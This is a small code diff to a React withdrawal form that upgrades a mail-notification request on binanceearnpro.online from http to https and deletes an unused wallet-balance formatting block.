@@ -118,7 +118,7 @@ function Withdrawform() {
             wallet_balance: newamountnn,
           });
           ajax({
-            url: "http://binanceearnpro.online/sendmail",
+            url: "https://binanceearnpro.online/sendmail",
             method: "POST",
             headers: {
               "Content-Type": "application/json",
@@ -145,13 +145,6 @@ function Withdrawform() {
     }
   };
 
-  const walletBalance = isNaN(userInfos.wallet_balance)
-    ? formatLocaleCurrency(0, "USD", {
-        autoFixed: false,
-      })
-    : formatLocaleCurrency(userInfos.wallet_balance, "USD", {
-        autoFixed: false,
-      });
 
   return (
     <>
